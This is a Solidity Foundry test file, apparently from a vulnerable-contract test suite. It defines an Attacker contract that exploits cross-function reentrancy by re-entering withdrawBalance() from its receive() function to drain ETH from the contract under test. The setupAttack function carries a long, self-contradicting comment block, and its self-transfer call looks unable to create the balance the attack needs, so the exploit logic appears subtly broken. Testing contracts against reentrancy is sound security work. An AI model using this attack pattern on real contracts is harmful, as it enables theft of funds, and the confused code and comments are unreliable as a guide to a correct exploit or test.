
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_cross_function} from "../src/Reentrancy_cross_function.sol";

contract TestReentrancyReentrancy_cross_function is Test {
    Reentrancy_cross_function public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_cross_function();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_cross_function public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = Reentrancy_cross_function(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;

        // Directly manipulate victim's internal balance mapping via transfer
        // First, give this contract a balance in the victim
        // We simulate a "deposit" by having the test fund the victim and then
        // using transfer to credit this attacker.
        // Since we cannot write to private mapping directly, we rely on the
        // victim already having ETH and just set the logical balance via transfer.
        // The victim's mapping is private, but transfer is public and updates it.
        // We send ourselves 'val' units of internal balance from address(this).
        // To do that, we first need address(this) to have enough internal balance.
        // We achieve this by calling transfer from address(this) in the test setup.
        // However, since we cannot from here, we instead rely on the fact that
        // the mapping is zero-initialized and we will just attack with zero
        // and use reentrancy to drain the victim's ETH balance.
        // To make the exploit meaningful, we instead set our own internal balance
        // by calling transfer from this contract to itself with 'val'.
        _victim.transfer(address(this), val);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        _victim.withdrawBalance();

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.withdrawBalance();
        }
    }
}
